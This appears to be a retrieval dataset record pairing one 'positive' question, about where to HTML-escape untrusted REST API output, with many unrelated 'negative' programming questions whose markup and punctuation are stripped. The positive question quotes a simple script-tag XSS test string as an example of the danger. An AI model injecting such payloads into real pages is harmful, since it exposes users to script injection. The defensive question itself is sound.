Positive 4804 pI have an application that consists of a serverside REST API written in PHP, and some clientside Javascript that consumes this API and uses the JSON it produces to render a page.  So, a pretty typical setup.p  pThe data provided by the REST API is untrusted, in the sense that it is fetching userprovided content from a database.  So, for example, it might fetch something likep  precode     message ltscriptgtalertGotchaltscriptgt  codepre  pObviously, if my clientside code were to render this directly into the pages DOM, Ive created an XSS vulnerability.  So, this content needs to be HTMLescaped first.p  pThe question is, when strongoutputtingstrong untrusted content, should I escape the content on the server side, or the client side  I.e., should my API return the raw content, and then make it the client Javascript codes responsibility to escape the special characters, or should my API return safe contentp  precode     message ampltscriptampgtalertamp039Gotchaamp039ampltscriptampgt  codepre  pthat has been already escapedp  pOn one hand, it seems to be that the client should not have to worry about unsafe data from my server.  On the other hand, one could argue that output should always be escaped at the last minute possible, when we know exactly emhowem the data is to be consumed.p  pWhich approach is correctp  pNote There are plenty of questions about handling input and yes, I am aware that clientside code can always be manipulated.  This question is about emoutputtingem data emfromem my server which may not be trustable.p  pstrongUpdatestrong I looked into what other people are doing, and it does seem that some REST APIs tend to send unsafe JSON.

Negative 4804 pThis is about when a .NET remoting exception is thrown. If you take a look at MSDN, it will mention that a remoting exception is thrown when something goes wrong with remoting. If my server is not running, I get a socket exception which is fine. p  pWhat I am trying to figure out is does getting a remoting exception indicate for sure that my server is up and running If yes, that would solve the problem. If not Is there a way to figure out if the remoting exception originated on the client side or the server sidep  h3Updateh3  pThe problem I am trying to solve is that the server is down initially and then client sends some message to the server. Now I get a socket exception saying No connection could be made... which is fine. p  pThere is a thread that is sending messages to the server at regular intervals to see if the server is available. Now, the server comes up, and at that point, you could get the response which is fine or you could get some exception and most probably it will be a remote exception. So, what I am trying to ask is that in case I dont get a message and I get a remote exception is there a chance that the server is up and running and I am still getting this exception p  pAll I am doing is just calling a method on the remote object that does nothing and returns. If there is no exception then I am good. Now, if there is a remoting exception and if I knew the remoting exception occurred on the server then I know in spite getting the exception, I am connected to the server.p

Negative 4804 pFollowing on from Jeff and Joels discussions of plugin architectures.p  pPlugins in C using runtime loaded dlls are always a bit of a pain. You have to do a lot of ground work to enable them and then the plugin must also be written in C, often even with the same compiler. COM objects and ActiveX solved some of these problems but introduced a few of their own.br  Then to add say, a python interface, to a C app is a large amount of work.p  pAm I correct in thinking that all libraries or assemblies or whatever you call them written in one .Net language can always be called from another .Net language And can objects an data types be automatically transferred between themp  pPresumably since all .Net languages also use Winforms or WPF for the gui, then giving plugins access to the main apps gui is also relatively simple.p  pSorry if this is a rather obvious point  Im just an old fashioned C programmer. But the ease of reusing existing C libraries via CCLI has convinced me that C.Net might be worth more investigation.p  pEdit  thanks, I was looking to discuss if plugins were a reason to go .Net . Being able to write ironpython while having my business users able to write a simple plugin in VB and technical users be able to craft something clever in F without me doing any more work seemed a good reason to switch from Cp

Negative 4804 pWe are using ASP.NET MVC with LINQ to SQL. We added some features and tested them all to perfection on our QA box. We are using Windows Server 2003 and SQL Server 2005. So when we pushed out changes to the Live web server we also used Red Gate SQL Compare to push new database changes to the LIVE database. We tested again between the few of us, no problems. Time for bed.p  pThe morning comes and users are starting to hit the app, and BOOM. We have no idea why this would happen as we have not been doing any new types of code things that we were not doing before. However we did notice that during the SQL Compare sync the names of all the foreign keys were different between the two databases, not the IDs in the tables, FKAssetAssetA0EB67 to FKAssetAssetB67EF8 for example, dont remember the exact number of trailing mixed characters during the SQL Compare, we are not sure why but that is another variable in this problem.p  pStrangely once this was all pushed out we could then replicate the errors on QA, but not before everything was pushed to LIVE.p  pQA and LIVE databases are on the same SQL Server, but the apps are on different instances of Windows Server 2003.p  pErrors generatedp  pIndex was outside the bounds of the array.p  pInvalid attempt to call FieldCount when reader is closed.p  pServer failed to resume the transaction.p  pThere is already an open DataReader associated with this Command which must be closed first.p  pA transportlevel error has occurred when sending the request to the server.p  pA transportlevel error has occurred when receiving results from the server.p  pInvalid attempt to call Read when reader is closed.p  pInvalid attempt to call MetaData when reader is closed.p  pCount must be positive and count must refer to a location within the stringarraycollection.

Negative 4804 pI have a program with a emmainem thread and a emdiagnosticsem thread.  The main thread is basically a codewhile1code loop that performs various tasks.  One of these tasks is to provide a diagnostics engine with information about the system and then check back later i.e. in the next loop to see if there are any problems that should be dealt with.  An iteration of the main loop should take no longer than 0.1 seconds.  If all is well, then the diagnostic engine takes almost no time to come back with an answer.  However, if there is a problem, the diagnostic engine can take seconds to isolate the problem.  For this reason each time the diagnostic engine receives new information it spins up a new diagnostics thread.p  pThe problem were having is that the diagnostics thread is stealing time away from the main thread.  Effectively, even though we have two threads, the main thread is not able to run as often as I would like because the diagnostic thread is still spinning.p  pstrongUsing Boost threads, is it possible to limit the amount of time that a thread can run before moving on to another threadstrong  Also of importance here is that the diagnostic algorithm we are using is blackbox, so we cant put any threading code inside of it.

Negative 4804 pthis is less an objectivec question and more a generic programming question  I am placing three subviews in my view at random xy locations. Each subview has a width of 48 and a height of 105.I am trying to make sure no random placement of a subview occupies the area of an existing subview i.e. views 2 cannot overlap 1, view 3 cannot overlap 1 or 2. I just cant seem to work out the logic in my head. See code below.p  pWhat I have works to some extent, I declare an array objInitLoc thatll hold the xy wh data for each object, and on awake  run a loop for the count of all the objects 3. Each loop checks the count of this array  if 0 then run the subroutines to insert an array into  objInitLoc to hold the first object data. So objInitLocs first object will be excuse the PHP style code here arrayarrayx, y, w, h. Then on the second loop, the count will now equal 1, so I generate a new x and y location, pull the existing location array of the first object from objInitLoc and run a while loop to see if there is a conflict, if there is, generate a new x and y...heres where I get muddled, should I have the loop through the contents of objInitLoc within the while statement Ive been plugging at this too long and am in a foresttrees confusion state.

Negative 4804 pI just found a bug on one of my softwares where I had forgotten a where clause. The code was something like that p  precodedeclare foo bigint declare bar bigint select foo  foo, barbar from tbFooBar where ....a long list of condition goes there      ... and an extra condition should have went there but I forgot it codepre  pUnfortunately, the where clause I forgot was useful in very specific corner cases and the code went through testing successfully.p  pEventually, the query returned two values instead of one, and the resulting bug was a nightmare to track down as it was very difficult to reproduce, and it wasnt obvious at all that this specific stored procedure was causing the issue we spottedp  pDebugging would have been a lot easier if the foofoo had raised an exception instead of silently assigning the first value out of multiple rows.p  pWhy is that this way I cant think of a situation where one would actually want to do that without raising an error bearing in mind the clauses distinct and top are there for a reasonp  pAnd is there a way to make sql server 2008 raise an error if this situation occurs p
Negative 4804 pDear Community. I like to understand a little task, which have to help me improve performance for my application. I have array of dictionaries, in singleton area with objects NSDictionary and keys code  country specificp  pI have to receive country and specific values from this array. My first version of application was using predicate, but later i find a lot of memory leaks and performance issues by this way. Application was too slow and dont empty very quickly a memory stack, coming to around 1G and crash.p  pMy second version was little bit more complicated. I was filled array in singleton area with objects per one code and function, which u can see bellow.p  precodevoidcodeIsSameNSArray codeForCheck  synchronizedself  NSString code  [codeForCheck objectAtIndex0]  if [code isEqualToStringcode]       code  nil     NSUInteger queneNumberInt  [[codeForCheck objectAtIndex1] intValue]     NSLogWe match code country specific quenelu,code, country,specific, queneNumberInt     [[ProjectArrays sharedProjectArrays].arrayDictionaryesForCountryCodesResult insertObjectresult atIndexqueneNumberInt]   code  nil  return  codepre  pThe way to receive necessary issues is a p  precodeSEL selector  selectorcodeIsSame [[ProjectArrays sharedProjectArrays].myCountrySpecificCodeListWithClass makeObjectsPerformSelectorselector withObjectcodePlusQueueNumber] codepre  pThis version working much better, no memory leaks, very quickly, but too hard to debug. Sometimes i receive empty result, i tried to synchronize thread jobs, but it still not work stable. The main problem in this way is that in strange reason sometimes i dont have result in my singleton array. I tried to debug it, using index of array for different threads, and have result that class just missed answer.p  pCore data dont allow me to make copy of main MOC and for multithreading design i cant using it lock and unlock is not good idea, and thats way product too much error in lockunlock part of code.p  pMaybe anybody can suggest, what i can do better in this case I need a best way to make decision which will work stable, will be easy to coding and understand itp  pMy current solution is using NSDictionary, where is a keys is a code and under that code i have dictionary with countryspecific. Working fine as well, but dont decide a main task  using core data if u need multiply access from too many threads to the same data.p

Negative 4804 pIm currently using registershutdownfunction for multiple purposes. One use is for handling fatal errors, while the other is for logging resources used during execution like time, memoryusage etc. p  pCurrently I register two different shutdown functions, but on one test only the first ran while the other seemed to fail. Now this could ofcourse be triggered by some error within the function itself so I have rewritten it, but is it possible an error was caused by using several registershutdownfunction calls So what is considered best practice here, to registert two different functions or just make the call to one function that handles the different tasksp  pIs it also safe and possible to make the function load a class for errorhandling if a fatal error occurs or should I keep the functionality within the function itselfp  pThe final question I got is if theres a better way to handle fatal errors than using shutdown functions I tried using seterrorhandler, but it does not cover all errortypes so some errors will not trigger this.p  pHope these questions are well formulated and clear. My goal is to keep the code as solid as possible and I could not find any decent answers to the questions I had.p  pEdit Found the answer to my first question, registering several functions should be no problem so the error had to be within the function itself. Leaving the question up to get answers to whether theres a better ways to handle fatal errors.p

Negative 4804 pThe app uses the a hrefhttpdeveloper.android.comreferenceandroidlocationGeocoder.htmlGeocodera object. It works fine on my stock Froyo Nexus One. But then I run the exact same app on a different device an Advent Vega 10 tablet also running Froyo and I get this exception emService not Availableem. The method Im using is codegetFromLocationNamecode, Im building against the Android 1.6 Google API.p  pIm aware of an issue where this exception is thrown on the emulator, but I suspect this is different. Why would it be thrown on one device running Froyo but not anotherp  pThe app is a location app, and as the tablet has no GPS or mobile network, in a scenario where the WiFi connection doesnt provide a location, the user must manually specify it, so not being able to use the Geocoder object is bad news.p  pI could add a way for the user to select the location on a map, but its not ideal. Possibly I could use the Google Maps API directly, but Im keen to understand the nature of the issue first as would be nice to have an easier solution.p  pHopefully in a future release Android will include an OSlevel default location for nonGeocoder devices, so locationaware apps work out of the box on devices like Google TV.p

Negative 4804 pIm a CM and am responsible for our Continuous build process, and helping the developers define and use the builds correctly. I try to set things up in such a way that the developer merely has to download the module from the Source control system, and type in codeantcode or codemavencode and have everything just work.p  pIn Ant projects, I either use codeivycode or have a codelibcode directory that contains the required third party jar files. This helps me to clearly define all the dependencies and makes it easy for the developers to get the module to build on their system. Yes, there is some dependency on the right JDK version, and somewhat on the right Ant version, but even these are a bit flexible. Besides Ecipse and JenkinsHudson allow you to define the exact JDK and Ant versions you want to use.p  pThe problem is this one project thats dependent upon Weblogic 10.3 aka 11g. Before Weblogic 10, you could pretty much get away with using just the weblogic.jar file and maybe one or two other jars. Starting with Weblogic 10, the jars are now modularized. p  pWhen I do a build, I still simply include codeweblogic.jarcode in my classpath. However, codeweblogic.jarcode, in its codeMANIFEST.MFcode file contains references to the code......modulesfeaturescode directory which is actually the parent directory that contains Weblogic 10.3. In here are jars that contain no classpaths, but themselves have a Classpath embedded in their codeMANIFEST.MFcode that points to other jars. These in turn can refer to other jars.p  pI figure I have one of these choicesp  ol liInclude the entire 10,900 file, 700Mb Weblogic in my source repository for each module.li liSomehow download Weblogic using either Maven or Ivy as a single tarball. Untar the file, then do my build.li liTell the developers that they must download Weblogic 10.3 and then modify the build process to point to where they installed Weblogic 10.3.li ol  pNone of these options really appeal to me right now.p  hr  h1UPDATEh1  pAs others pointed out, I could try to find the various jars, and I did exactly that with Weblogic 9.x and earlier versions. For example, a simple shell scriptp  precodefind WEBLOGICHOME name .jar  while read jar do    echo JAR NAME  jar    jar tvf jar done  less codepre  pwould display the content of all Weblogic JARs on my terminal. If I find in a build that codejavax.servlet.ServletExceptioncode class is missing, I could search for codejavaxservletServletException.classcode, then go back up searching for the codeJAR NAME code and find the name of the jar.p  pHowever, in Weblogic 10, I found that I depended upon codejavax.servlet.ServletExceptioncode, and traced it back to the codeCbeamodulesjavax.servlet1.0.0.0.0.jarcode which isnt even in my codeWEBLOGICHOMEcode directory. This is because codeCbeawlserver10.3serverlibweblogic.jarcode contains a classpath to code......modulesfeaturessomejar.jarcode. And codesomejar.jarcode doesnt contain any classes. Instead it contains a reference to another jar in its classpath, which then refers to the codejavax.servlet1.0.0.0.0.jarcode.p  pSo, I now have to add in four more jars, one of which contains no classes, and if I want to emulate the structure of Weblogic, I have to have the following files in my codelibcode directoryp  ul licodeweblogic.libwlserver10.3serverlibweblogic.jarcodeli licodeweblogic.libmodulesfeaturessomejar.jarcodeli licodeweblogic.libmodulessomeOtherJar.jarcodeli licodeweblogic.libmodulesjavax.servlet1.0.0.0.0.jarcodeli ul  pOkay, that only took about 2 hours to resolve. One dependency issue down, 43 more to go.p  pAs you can see, this may take days, even weeks to complete, and end up with dozens of jars in my ...uh... emminimalem Weblogic 10 module. In the end, this emminimalem module may not be all that much smaller.p  pDoes anyone know of maybe some documentation that allows me to quickly determine where these dependencies exist, or a way of building a dependency tree, so that when I need the classpath com.bea.weblogic.foo.bar.barfoo, I can quickly see that I need these 7 or 8 jarsp

Negative 4804 pI saw several questions related to XML, XSLT and HTML on stackoverflow, but I beleive my question is a little different. Here is what I needp  pI need to send an email to my customers. The wordings of the email can differ based upon the scenario. Each scenario has a corresponding format saved in the database. For example, one scenario might require this emailp  pemScenario 1 We have opened Ticket XXXReference Number XXX for your call on XXX. Kindly call us at XXX to track progress.em p  pAnother scenario might required this emailp  pemScenario 2 Thanks for your interest in our Product XXX. As discussed we will send our representative on XXX to your office located at XXX.emp  pAlso, the format might need to be altered a bit depending upon data availability. e.g. if I need to send email corresponding to scenario 1, and I dont have Reference Number available, I want to remove the reference number part completely on the fly not in database i.e. I want something like thisp  pemScenario 3 We have opened Ticket XXX for your call on XXX. Kindly call us at XXX to track progress.em p  pThe formats for scenarios 1 and 2 are stored in the database as XSLT corresponding to the strings you see above. Format for Scenario 3 has to be produced on the fly. The XXX part has to be replaced with actual data. This data is available in an XML serializable object that I have. p  pI want to serialize this object, produce an XML in memory, modify the XSLT a little on the fly to reflect the data I have, transform the XML in memory to HTML using the XSLT for the scenario and then pass the HTML as a string parameter to an email method I have. The email part works.

Negative 4804 pIm building an application using JPA 2.0 Hibernate implementation, Spring, and Wicket. Everything works, but Im concerned that my form behaviour is based around side effects.p  pAs a first step, Im using the codeOpenEntityManagerInViewFiltercode. My domain objects are fetched by a codeLoadableDetachableModelcode which performs codeentityManager.findcode in its codeloadcode method. In my forms, I wrap a codeCompoundPropertyModelcode around this model to bind the data fields.p  pMy concern is the form submit actions. Currently my form submits pass the result of codeform.getModelObjectcode into a service method annotated with codeTransactionalcode. Because the entity inside the model is still attached to the entity manager, the codeTransactionalcode annotation  is sufficient to commit the changes.p  pThis is fine, until I have multiple forms that operate on the same entity, each of which changes a subset of the fields. And yes, they may be accessed simultaneously. Ive thought of a few options, but Id like to know any ideas Ive missed and recommendations on managing this for longterm maintainabilityp  ul liFragment my entity into subcomponents corresponding to the edit forms, and create a master entity linking these together into a codeOneToOnecode relationship. emCauses an ugly table design, and makes it hard to change forms later.emli liDetach the entity immediately its loaded by the codeLoadableDetachableModelcode, and manually merge the correct fields in the service layer. emHard to manage lazy loading, may need specialised versions of the model for each form to ensure correct subentities are loaded.emli liClone the entity into a local copy when creating the model for the form, then manually merge the correct fields in the service layer. emRequires implementation of a lot of copy constructors  clone methods.emli liUse Hibernates codedynamicUpdatecode option to only update changed fields of the entity. emCauses nonstandard JPA behaviour throughout the application.

I mean the header exactly fills the top of the browser window with no scrolling left or right and with exact height equals 65px.because it appears ok in my laptop ,but when i tried it in my friend laptop the header completely changes its position.p  pi think the position style effects the header i used the absolute ,but one of programmer i asked side it is not a good idea to set it as absolute

Negative 4804 pLets say I have a Core Data entity called Event, which represents recurrent yearly events. Each Event has a date property.p  pI need to present this events to the user sorted by next occurrence of date.

Negative 4804 pI am rendering very large X,Y,Z scientific datasets in the lateral plane and would like to click on the results to obtain greater textual detail about the area chosen by mouseclick.p  pSo, for example, imagine a scientific dataset which is rendered as a filled contour plot and there is a bright spot.  I would like to click on that spot to obtain a link or other textual information.  p  pThis would necessitate having another plane that would provide attribute information.p  pI would be most appreciative for any direction that others have used in similar cases.

My question is how do you design an application and implement it with complex logic.p  pIm using the Play framework, creating a java web app. Rather than just dealing with basic form based data being saved into the DB, imagine I send a file over to the servermaybe a spreadsheet and want to break it up and cleanse it before saving it to the db etc.p  pNow I want to do this in the most practical and well thought out way. I dont want a really tightly coupled system. I may for instance want to upload a csv file in the future and expect the same outcome.p  pSo basically just looking for some advice for building a complex model. Until now my models have been just one object. To me this problem of breaking the file up looks like Im going to write a seperate package with some utilities etc and a main service object to process the raw data.p  pAny advice as always will be much appreciated.p

Negative 4804 pThis is an Architectural question concerning the Rackspace Cloud Files. Ive successfully added Cloud Files functionality PHPMySQL  ClassesPackage to one of my projects domains and would like to somehow provide search functionality for these files PDFs, etc to other projects domainssubdomains. It doesnt seem like the Meta Data within the Cloud Files can be searched directly, without requesting all object information within the Container not very efficient.p  pThe PHP Cloud Files package does provide a way to search by file prefix, but not thru a Meta Search. This prefix is what is typically used to create seudodirectories in your container.p  pId like to search thru the Meta Data provided in the Cloud Files efficiently. I may end up having several domains sharing a Cloud Files Container of files with Meta Data for each file. Should I create an external MySQL database accessible from all the domains to manage the meta data search functionality for the Containers Is there anything already created for this type of purposep  pExample Situation A PDF is created at domain 1. PDF is written to the Cloud Files container. Meta Data includes a persons related information Cloud Files Meta  Not PDF Meta. Domain 2 needs to search the shared Cloud Files Container by a persons identity and present all related files for that person.p  pThanks for any commentshelp. Jeff Waltersp

Negative 4804 pIm attempting to decrypt an SMIME email sent originally via Outlook, and to do that, Im using the bouncycastle API. Im running into a snag, though.p  pI have, in the Windows certificate store, the certificate for the recipient. I had previously used it to send a signed and encrypted email to the other party, and they in turn used it to send me an encrypted reply. I then exported the certificate with private key as a .pfx file, and I loaded this pfx file into a Java KeyStore. It doesnt work, however, and I suspect thats because the subject key identifiers dont match.p  pHeres the code Im using to get the subject key id from the KeyStorep  precodeKeyStore ks  KeyStore.getInstancePKCS12 char[]   pw  password.toCharArray  ks.loadnew FileInputStreamdcertprivkey.pfx, pw  Enumeration en  ks.aliases  while en.hasMoreElements       String alias  Stringen.nextElement     System.out.printlnalias      if ks.isKeyEntryalias               Certificate[]   chain  ks.getCertificateChainalias         X509Certificate cert   X509Certificatechain[0]          byte[] id  cert.getExtensionValue2.5.29.14          System.out.println    toHexid       codepre  pThis prints out the following key identifierp  precode04 16 04 14 88 ed bb 7c 64 7b 41 63 48 0a 24 40 2b 3c d0 78 72 3c 30 b3 codepre  pWhen I check the Windows certificate store, however, the key identifier is differentp  precode88 ed bb 7c 64 7b 41 63 48 0a 24 40 2b 3c d0 78 72 3c 30 b3 codepre  pThe KeyStore returns an extra 4 bytes in the front the subject key identifier should be the 160bit SHA1 hash of the key, and therefore 20 bytes long, correct.p  pEven more confusing is the fact that when I parse the SMIME email using the bouncycastle API, and go through the recipients codeSMIMEEnveloped.getRecipientInfos.getRecipientscode, the only recipient returned there should be only one has this subject key identifierp  precode04 14 88 ed bb 7c 64 7b 41 63 48 0a 24 40 2b 3c d0 78 72 3c 30 b3 codepre  p... it has only two extra bytes, not four, and I assume this is why Im unable to decrypt the email with the certificate.p  pWhy do none of these subject key identifiers match up What am I doing wrongp

Negative 4804 pIm curious if there is way to digitally sign documents technically any piece of data, such as contracts or photos, so that 10 years from now, it can be proven that they are from this time, not forged 9 years from now.p  pFor example, I could write a prediction of the future and sign it with convential means to prove that I wrote it, then timestampsign it so that when it comes true, I can prove I predicted it.p  pOne way I thought of is that there could be a timestamping authority. You send them the data, they make a hash of the data  timestamp and encrypt the hash with RSA using their private key. A signed document thus exists of data, timestamp, encrypted hash.p  p10 years from now, I hash the data  supposed timestamp, and check if it matches with the encrypted hash that I decrypt using the authoritys public RSA key which I trust. If it does, I known the timestamp is valid.p  pI can see 2 problems with that thoughp  ul liAn external authority is neededli liThe authoritys private key would need to be kept extremely secret, because if its revealed, all documents signed with it turn invalid.li ul  pCan you think of a solution without one of these problemsp

Negative 4804 pI dont have a problem as such as I have a workaround.  However the process of understanding and developing the workaround has highlighted what seems to me a fundamental gap in my knowledge as a selftaught programmer, this happens a lot   and I cant seem to find the answer to plug it anywhere.p  pStandard node.jsexpress setup with for examplep  precodeapp.getindex.htm, function request, response      console.logindex.htm  app.get, function request, response      console.log  codepre  pWhy when the user connects directly to index.htm by typing in the URL although Ive not tried clicking on a link does nothing fire   The page is served no problem.  The obvious usecase for this is to check if the user is authenticated prior to serving the static page.p  pFYI the workaround is to pass the user to a route such as authenticated which matches fine, do the check and then redirect and basically block everything else.p  pThanks for educating me in advance p  pNp  pUPDATE to Raynos question  yes ignore the serverapp variable name discrepancy.p  precode CREATE SERVER var server  express.createServer server.configurefunction      server.useexpress.staticdirname  public     server.useexpress.logger     server.useexpress.errorHandlerdumpExceptions true, showStack true  start of session stuff server.useexpress.cookieParser server.useexpress.sessionstore sessionStore, secret secret, key express.sid  codepre  pIve now found that the routing matches fine once you delete the static file i.e. in the original example, deleting index.htm means that the console will now log index.htm. p  pNp

Negative 4804 pIm building a Tab Bar app, pretty all GUI modeling is done with IB. So, my MainWindow xib file contains an UITabBarController that is retained by a files owner outlet. All of my Tabs are navigation controllers with view controllers. I have dragged those navigation controllers from the window view in IB, also dragged the starting view controllers for each of that navigation controller. p  pThe questions is do I need to have an outlets for those NavCons and ViewCons in my mainAppDelegate class, in order to do proper memory management and release them in dealloc If so, why I cant connect them in main xib file because no outlets are shown in popup window. Should note that all those properties have an outlet keyword in front of them.p

Negative 4804 pI have been playing around with yasm in an attempt to grasp a basic understanding of x86 assembly. From my tests, it seems you call functions from the kernel by setting the EAX register with the number of the function you want. Then, you push the function arguments onto the stack and issue a syscall 0x80 to execute the instruction. This is Mac OS X  BSD style, I know Linux uses registers to hold arguments instead of using the stack. Does this sound right Is this the basic ideap  pI am a little confused because where are the functions documented How would I know what arguments, and in what order, to push them onto the stack Should I look in syscall.h for the answers It seems there would be a specific reference for supported kernel calls other than C headers.p  pAlso, do standard C functions like printf rely on the kernels builtin functions for say, writing to stdout In other words, does the C compiler know what the kernel functions are and is it trying to figure out how to take C code and translate it to kernel functions which the assembler then translates to machine codep  pC code  C compiler  kernel calls  asm  assembler  machine binaryp  pIm sure these are really basic questions, but my understanding of everything that happens after the C compiler is rather muddy.p

Negative 4804 pIn a particular scenario I have a lookup table with MachineNumber Varchar and its MachineID Int. In my transaction table I refer to the Machine number using lookup tables MachineID.p  pRequirement Can I have the MachineID field type set as Varchar in the transaction table whereas retaining its type as Int in the lookup table Reason, for some Machines the MachinNumber is not stored in the Lookup table and I need to store the actual MachineNumber provided by the user in the Transaction table itself and as the Machine number is alphanumeric I want to change the type of this referenced field from Int to Varchar.p  pIn a nutshell in the transaction table the MachineID field should contain both MachineID referenced from the lookup table and actual Machine Number provided by the user and stored directly herep  pQuestion Is it a good practice to have different types for these referenced fields or is it a common practice, what will be the effect on the queries with Join between these two tablesp  pThanks, Alindp

Negative 4804 pIm trying to copy a pointers data to another pointer, so that if I change one, the value in the other doesnt change.p  pI need this because I am coding a loop where I have two struct pointers, value, and lastValue. In each iteration of the loop I assign codevaluecodes content to codelastValuecode, and I fill codevaluecode with new content. The problem is that because both are struct pointers, when I change codevaluecode, codelastValuecode changes too, and thats not the behavior I want. The code would be something like this the structs are codeIplImagescode from OpenCVp  precodeIplImage value Iplimage lastValue while1     lastValuevalue    valuecvQueryFrame capture This fills the struct with new information  codepre  pThis would work if they where normal structs, but because they are pointers, both end up with the same value. Is there a way to get a copy of a pointer, with the same value, but different addressp

Negative 4804 pI spent the last days reading through man pages, documentations and anything else google brought up, but I suppose Im even more confused now than I was at the beginning.p  pHere is what I want to do I want to send and receive data packets with my own layer 3x protocols via a wireless interface 802.11 on Linux systems with CC.  So far, so good. I do not require beacons, association or any APSSID related stuff. However, for data transmissions Id like the MAC layer to behave as usual, meaning unicast packets are ACKd, retransmissions, backoff etc. Id also like to enjoy the extended QoS capabilites 802.11e with 4 queues and different access categories. Promiscuous mode on the other hand is not a concern, I require only broadcast packets and packets sent to the specific station.p  pWhat would be the right way to go about it Most of the documentation out there on raw socket access seems to be focused on network sniffing and that does not help. Ive been playing around with the strongmonitor modestrong for some time now, but from what Ive read so far, received packets are not ACKd in monitor mode etc. Without monitor mode, what would be the alternative Using strongad hoc modestrong and unix raw sockets Or do I have to fiddle around with the driversp  pIm not looking for a complete solution, just some good ideas, where to start. I read through the man pages for socket2, socket7 and packet7 but that did not help concerning the behaviour of the MAC layer in different modes.p  pThanks in advance.p

It turns out that if you use Add Service Reference the generated code uses the metadata to create client side types.

To enable me to use the contracts in the Common assembly I took inspiration from this post a hrefhttpxaml.geek.nzworkingslightlysmarterwithwcf relnofollowhttpxaml.geek.nzworkingslightlysmarterwithwcfa.

Negative 4804 pSuppose we have an object that can be sorted using two or more comparison functions. For instance a codeBoxcode that has a codelengthcode, a codewidthcode, and a codeheightcode. We can sort an array of boxes according to any of these fields.p  pNow consider two arrays of codeBoxcode objects that contain identical boxes. In the first array the boxes are sorted in order of increasing size by their codelengthcode. In the second array the boxes are sorted in order of increasing size by their codeheightcode. Most likely these two sorted arrays will list the boxes in a different order. p  pWe want to find a third array that has a subset of the boxes and has the property that if we sort them by either their codelengthcode or their codeheightcode, we will have the same sorted order.p  pIs this simply a matter of finding the longest common subsequence of boxes between the two sorted arrays Is there a better way to do this or a nice implementation in C without having to implement the algorithm for LCS if that is the most practical way to go Are there any data structures that maintain this property on their own that are practicalp

Negative 4804 pI have been developing my first TCPSocket based application with Apache Mina, it looks great and easy to do things. I just want to ask a question here about Mina.p  pThe server impose an idle time of 5 second will terminate the socket connection, so we have to send periodic heartbeat echo message  keepalive to make sure connection is alive. Sort of keepalive mechanism. p  pTheres one way that we send blindly echoheartbeat message just before every 5 seconds. I am thinking, there should be smartintelligent way  Idle Monitor if I am sending my business message and do not come to idle time i.e. 5 second, I should not issue heartbeat message. Heartbeat message will be sent if whole connection is idle, so that we save bandwidth and fast reading amp writing on socket.p  pThanks in advance, for all who like this concept and try to give the solution.p

Negative 4804 pThis should be pretty simple, but I cant seem to get it.  I have a setup project VS2010 that packages a few dozen image files along with my SQLite file and copies them to the users computer when the program is installed.  As these are essentially stock images, its ok if the user deletes them there is functionality to do so from within the program.  However, after one or more of these images have been deleted,  the next time the program starts it gives a Windows installer dialog box, and deletes all of the remaining data filesp  pWhat I think is happening is the program sees the missing files, assumes the installation has been corrupted, and tries to go into some kind of recoveryuninstall mode.  Id like to know how to indicate in the setup project that the files need to be installed, but may be removed by the user at any time.  p  pI have tried several combinations of File properties, and nothing seems to do quite what I want, which is for my installer to put them where I say and never think about them again.  Do I have to reinvent the wheel and do this through a custom actionp  pEDIT Transitive and Vital had both been set to True.  Setting them to False causes the program to readd the deleted images back after it has been restarted  Ill probably go with a custom action if I dont get an answer.p

Negative 4804 pI have created an ASP.NET MVC 4 WebApi application, which uses claims based authentication, and uses Azure ACS as a federated authentication. Everything works fine out of the box, by that I mean that I have configured my Azure ACS as an STS reference, I have added class for SWTSecurityTokenHandler to be able to read SWT tokens from ACS, and now when I go into a secure address in my browser, I get redirected to ACS page where I can select my Identity provider, after selecting one I log in to this IdProv, and then I get redirected to my application, which can read claims from the generated token.p  pNow my problem is, that I am trying to reimplement the same requestredirectresponse path from some identity provider to ACS and to my application using just fiddler to imitate the requests and responses. I was able to get a token from my IdProv, pass it to ACS, and get an SWT token from ACS. p  pBut in whatever way I try to pass the ACS token to my application, it always redirects me to ACS IdProv selection page. I have no idea how to pass the token, so my application would try to use it. Can you guys instruct me on thatp  pI am asking about it, because I will want to create a JS client, which will invoke this login logic later on, thats why I wont be able to use ACS IdProv selection screen.p  pAm I doing something wrong, or my whole logic to pass the token is wrong I would really appreciate some assistance, I have been struggling with that for almost a week now. p  pUPDATEp  pI have tried to create something similar to what is shown in this ACS example a hrefhttpmsdn.microsoft.comenuslibraryhh674475 relnofollowhttpmsdn.microsoft.comenuslibraryhh674475ap  pIt is an example showing how to get an OAuth token from ACS, and I have managed to get a token from my ACS using this code a hrefhttppastebin.comtyTdNVCf relnofollowhttppastebin.comtyTdNVCfap  pAnd the final version of the code, tries to pass the obtained token to my application running on localhost but my application always returns the ACS IdProv selection page as a response.

Negative 4804 pIm in a real pickle and desperately need some help with a critical problem Im having.  p  pIve spent months writing a HTML5 appwebsite along with a native Android application that is simply a WebView wrapper for the HTML5 website.  One of the core features of the application is that users can share app specific URLs to Facebook and Twitter etc so that their friends can follow the shared URLs which will open up either the HTML5 version of my app in their browser OR MOST IMPORTANTLY if they are on Android and they have my native Android app installed they are PROMPTED TO OPEN IN MY APP.p  pThis is a rather long complicated issue so to simplify Ill use some certain terms consistently throughout this postp  ul liMyApp user a Android device user who DOES have my native Android app installedli linonMyApp user a Android device user who DOES NOT have my native Android app installedli listock browser user a stock Android user who uses a stock browser li linonstock browser user a Android user who uses a nonstock browser note the Samsung Galaxy SII stock Internet app is considered nonstockli lichoose app dialog on Android the OS dialog that appears asking the user what application they want to open the actionintenturldocument with and if they want to default to use this application alwaysli ul  hr  pMy AndroidManifest.xml contains the following...p  precodeltintentfiltergt   ltaction androidnameandroid.intent.action.VIEW gt   ltcategory androidnameandroid.intent.category.DEFAULT gt   ltcategory androidnameandroid.intent.category.BROWSABLE gt   ltdata androidschemehttp androidhostmyapp.com androidpathPrefix gt ltintentfiltergt codepre  pWhen tested this WORKS PERFECTLY in any normal scenario.

Great, Ive definitely configured my AndroidManifest.xml correctly.p  pHowever things do NOT ALWAYS WORK in the critical Facebook sharing scenerio.  It does not always work because both Facebooks native Android app and Facebooks mobile website httpm.facebook.com DO NOT LINK DIRECTLY to the shared URLs but instead link via a Facebook redirect page.

